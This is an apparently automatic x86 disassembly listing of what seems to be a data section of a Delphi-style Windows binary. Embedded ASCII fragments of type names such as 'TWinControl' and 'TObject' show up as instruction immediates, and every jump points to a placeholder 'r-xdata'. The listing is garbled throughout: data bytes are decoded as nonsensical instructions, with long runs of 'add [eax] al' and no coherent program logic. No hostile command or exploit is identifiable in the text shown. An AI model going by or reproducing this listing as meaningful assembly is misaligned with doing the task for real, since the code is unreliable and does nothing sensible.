adc [ eax ] al
mov eax eax
rcr ch 0x43
jpe r-xdata
jb r-xdata
add [ ecx + ebp * 8 + 0x10000043 ] ch
inc eax
add al ch
fild [ ebx ]
or [ edi ] cl
push esp
push ebx
je r-xdata
add eax 0x65530608
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43de48c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43ddc0c0 ] cl
add [ eax + edx + 0x40 ] dl
jbe r-xdata
inc ebp
push edx
jae r-xdata
push es
jb r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
outsb
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
dec eax
fiadd [ ebx ]
or [ esi ] dl
je r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
jpe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
loopne r-xdata
js r-xdata
insb
outsd
ja r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
sbb al 0x11
inc eax
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
add [ eax ] ecx
arpl [ ecx + eax + 0x8 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xor ch bl
inc ebx
add [ eax ] cl
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
inc esp
add [ eax ] bh
add dl cl
loope r-xdata
and eax [ eax + eax + 0x38 ]
add [ eax ] al
add al 0x2c
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
js r-xdata
outsb
je r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax + 0x16 ] dl
inc esp
add [ eax ] ah
xor eax 0x351c0044
inc esp
add ah ch
xor eax 0x18940044
inc esp
add al bl
pop ds
inc esp
add [ edi + ebx ] bh
inc esp
add [ eax + ebp + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax + 0xe ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] bh
add [ eax ] al
mov esp 0x54004010
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
inc esp
add [ eax ] bh
inc ecx
add [ ecx + eax ] bl
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x4fffbfcb ] ah
cmp [ eax + eax - 0x24 ] eax
xor al [ eax ]
clc
xor al [ eax ]
sub [ edi ] dl
jo r-xdata
add [ esp + ebp ] al
inc ebp
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
add al 0x8
push es
lea eax [ eax ]
pushad
fild [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
fild [ ebx ]
fsub st1
inc ebx
add [ eax ] al
jbe r-xdata
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + 0x4119 ] ch
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov esp 0x80043de
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
inc esp
add [ eax - 0x77ffbbba ] dl
cmp al [ eax + eax - 0x4c ]
dec ecx
inc ecx
add [ eax + 0x46 ] bl
inc esp
add [ eax ] ah
sbb al [ eax + eax - 0x74 ]
sbb [ eax + eax + 0x38 ] eax
add [ eax ] ch
pop ss
push eax
outsd
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
sub_43e328
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jecxz r-xdata
inc ecx
add [ esi + 0x13a00041 ] ch
inc esp
add [ ebx + ebp * 8 + 0x14140044 ] dl
inc esp
add [ ebx + ebp * 8 + 0x4aa00044 ] bh
inc esp
add [ ebp + edx + 0x14480044 ] cl
inc esp
add [ esp + ebp * 8 ] cl
inc esp
add [ eax ] ah
in al dx
inc esp
add [ eax + 0x48004414 ] al
in al dx
inc esp
add ah bl
adc al 0x44
add [ eax - 0x14 ] dl
inc esp
add ah bh
adc al 0x44
add [ eax - 0x14 ] bl
inc esp
add [ eax - 0xfffbbb6 ] ch
adc eax 0x16300044
inc esp
add [ edx - 0x1393ffbc ] bl
inc esp
add [ eax - 0x14 ] dh
inc esp
add [ eax + 0x15 ] al
inc esp
add [ eax + 0x15004412 ] dh
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xe408c08b
inc ebx
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ esp ] al
inc ebx
add [ eax + eax ] ah
add [ eax ] al
in al 0xd3
inc ebx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
or al 0xa6
inc ecx
add [ edx + ecx * 2 + 0x44 ] bh
add [ eax - 0x5a ] al
inc ecx
add [ esp + edx - 0x598bffbc ] dh
inc ecx
add [ eax + 0x15 ] ah
inc esp
add ah al
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x5a ] bl
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
in eax 0x43
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax ] cl
in eax 0x43
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
in al 0x43
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ ebp + 0x43 ] ah
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
in eax 0x43
out 0x43 eax
add [ esi + 0x40043e9 ] bl
add al [ eax ]
add [ edi + ebx * 8 ] dl
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
aam 0x4b
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
outsd
insb
jae r-xdata
mov eax eax
lodsb [ esi ]
in eax 0x43
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
je r-xdata
inc ebx
outsd
in eax 0x43
add [ ebx + 0x43e568c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or ch ah
inc ebx
add [ eax ] ecx
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
shr [ ebp + 0xb010043 ] 0x54
inc edx
jbe r-xdata
sahf
jmp 0x247e661
insb
push edi
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
rcr [ eax + 0xa0043e4 ] 0x8
add [ esi ] ah
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
test al 0xe4
inc ebx
add [ ecx ] al
or al 0x54
or cl [ eax ]
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or al 0xe5
inc ebx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x4fffbbb6 ] dh
xchg ebx eax
inc esp
add ah cl
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax ] dl
pop esp
inc esp
add [ edi + ebx * 2 ] cl
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 + 0xe0044 ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
or al 0xe7
inc ebx
add [ eax + 0x43e9 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
inc [ esi + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
sub_43e9ec
add [ eax ] al
add [ eax ] al
mov al 0xea
inc ebx
add [ eax + 0x640043ea ] bh
add [ eax ] eax
add [ edi + ebx * 8 ] dl
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x4fffbfcb ] ah
cmp [ eax + eax - 0x24 ] eax
xor al [ eax ]
clc
xor al [ eax ]
sub [ eax + 0x46900044 ] ah
inc esp
add [ eax - 0x4bffbbc6 ] cl
dec ecx
inc ecx
add [ eax + 0x46 ] bl
inc esp
add [ eax ] ah
sbb al [ eax + eax - 0x74 ]
sbb [ eax + eax + 0x38 ] eax
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add ah cl
lahf
inc esp
add [ eax ] ah
xor eax 0x351c0044
inc esp
add ah ch
xor eax 0x18940044
inc esp
add al bl
pop ds
inc esp
add [ edi + ebx ] bh
inc esp
add [ eax + ebp + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax + 0x10 ]
mov eax [ 0x10044 ]
verw [ eax - 0x60 ]
inc esp
add [ edi ] cl
push esp
inc edi
jb r-xdata
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
jo r-xdata
cld
je r-xdata
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
test al 0xaa
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ edx + ebp * 4 + 0x44 ] cl
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax ] dl
pop esp
inc esp
add [ edi + ebx * 2 ] cl
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax - 0x7ffbb73 ] bl
stosb [ edi ]
inc esp
add [ edi + ebx * 4 - 0x75ebffbc ] cl
inc esp
add [ ecx * 4 - 0x545bffbc ] al
inc esp
add [ ecx ] al
add [ edi ] cl
add al bl
stosb [ edi ]
inc esp
add [ esi ] cl
push esp
inc ebx
jne r-xdata
add [ esi + ebx * 4 + 0x41 ] dh
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
int3
inc esp
add [ eax + 0xc0044a1 ] al
pop edi
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax - 0x7ffbb73 ] bl
inc esp
add [ edx ] ah
shr [ eax + 0x70043ed ] 0xb
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
push 0x32dc0044
inc eax
inc eax
add ah bh
insd
inc ebx
outsd
outsb
je r-xdata
stosb [ edi ]
inc esp
add [ edi + ebx * 4 - 0x75ebffbc ] cl
inc esp
add [ ecx * 4 - 0x5dafffbc ] al
inc esp
add [ eax - 0x5a ] ch
inc esp
add ah bh
mov [ 0xffffffffa5e40044 ] eax
inc esp
add [ esi ] cl
inc esp
add al bh
mov [ 0x40044 ] al
test [ eax ] al
test [ eax ] eax
adc dh [ eax - 0x5e1bfce9 ]
inc esp
add ah ch
mov eax [ 0xffffffffa3640044 ]
inc esp
add ah dl
cmpsb [ esi ] [ edi ]
inc esp
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
inc esp
add al bh
in al dx
inc ebx
add [ esp + ebp * 8 ] ah
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add al bh
xor al [ eax ]
test al 0xaa
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
outsd
insb
nop
sub ah ch
inc ebx
add [ edi ] al
push cs
push esp
inc ebx
jne r-xdata
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al bl
cmc
inc esp
add al bl
inc [ eax + eax + 0x38 ]
cmpsd [ esi ] [ edi ]
inc esp
add al ah
or al 0x45
add [ ebp + ecx + 0x45 ] ch
add [ eax + ebp * 4 + 0x44 ] bh
add [ esi ] cl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
pushad
je r-xdata
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x43ee7090
add [ edi ] al
push cs
push esp
inc esp
jb r-xdata
add [ ebx + 0x43ee18c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 8 + 0x43 ] bl
add [ eax + eax ] bh
add al al
hlt
add ah al
insd
inc ebx
outsd
outsb
je r-xdata
inc eax
add al bh
fdiv [ edx ]
inc esp
add [ esp + eax + 0x82c0045 ] ah
inc ebp
add ah ah
add eax [ ebp ]
add [ edx - 0x5f33ffbf ] ah
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
xor al [ eax ]
js r-xdata
add ah bl
xor al [ eax ]
clc
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
insb
cmc
inc esp
add [ edx ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ ecx ] dl
inc esp
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
pop eax
inc esi
outsd
insb
inc eax
jmp r-xdata
inc eax
add [ eax ] al
dec esp
add eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add eax 0x72440c00
popad
ja r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al bl
cmc
inc esp
add al bl
inc [ eax + eax + 0x38 ]
cmpsd [ esi ] [ edi ]
inc esp
add al ah
or al 0x45
add [ ebp + ecx + 0x45 ] ch
add [ eax + ebp * 4 + 0x44 ] bh
add [ edx ] cl
push esp
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x43ef3890
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
insb
out dx al
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
jae r-xdata
outsb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
add al [ eax ]
or al [ edx + 0x6c ]
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ esp + esi * 4 + 0x41 ] ah
add [ eax ] cl
add bh bh
dec eax
add [ ebp - 0x111bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
out dx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
out dx eax
inc ebx
add [ eax - 0x34000000 ] al
in eax dx
add al 0xf1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 ] al
sub al 0x1a
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080009 ] al
outsb
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ edx ] al
add bh bh
inc edx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or edx [ ebx + 0x68 ]
popad
jb r-xdata
insb
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
push ebx
je r-xdata
mov ah 0x41
add [ eax + 0x780044ff ] dh
inc [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
add eax [ eax ]
pop es
inc edx
imul eax [ ebx + 0x6f ] 0x6c
outsd
jb r-xdata
add ah bl
xor al [ eax ]
clc
dec ecx
insd
popad
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] al
push es
add [ esi ] al
dec eax
imul esp [ gs : edi + 0x68 ] 0x44f47074
add [ ebx ] al
add bh bh
inc ebx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ ecx ] cl
dec ecx
insd
popad
push esp
jns r-xdata
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add al 0x0
pop es
inc ecx
insb
insb
outsd
arpl [ edx + 0x79 ] ax
sbb al 0xf4
inc esp
add [ eax ] al
add bh bh
int3
xor al [ eax ]
xor al 0x33
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
inc ebx
add [ eax ] ch
add [ eax ] al
add al cl
adc [ eax ] al
adc [ eax ] al
xor al 0x0
add bh bh
lodsb [ esi ]
clc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x74646957
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xf1
add [ eax ] al
[ eax + edi * 8 + 0x10044 ]
add [ gs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
inc ecx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] al
